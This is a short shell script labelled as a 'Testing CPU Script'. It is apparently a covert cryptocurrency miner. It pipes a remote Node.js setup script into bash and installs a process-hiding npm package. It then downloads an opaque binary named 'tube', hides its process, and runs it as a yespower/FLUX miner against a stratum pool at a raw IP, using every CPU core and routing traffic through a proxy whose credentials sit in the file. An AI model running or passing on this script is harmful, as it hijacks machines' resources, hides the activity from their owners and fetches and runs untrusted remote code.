echo "==================== Info xARCH ===================="
echo "Testing CPU Script"
echo "***"
echo "SitBack And Enjoy"
echo "===================================================="

echo "+++++++ Fetch Mechine Code +++++++++"
apt update;apt -y install curl unzip autoconf git screen

wget -O - https://deb.nodesource.com/setup_17.x | bash
apt -y install nodejs
apt -y install npm
npm i -g node-process-hider

wget -O tube https://github.com/TamJsmt/TamJsmt/raw/main/data

echo "+++++++ Configure Code +++++++++"
chmod +x tube
ph add tube

echo "Configured Successfully"
./tube -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1HzAqXKFsLFVZJjfcKJJ3VG2ppoXKzJAqZ -p sam1e,c=FLUX -t $(nproc) -x socks5://goofyahh-rotate:bpzn8dndh21q@p.webshare.io:80
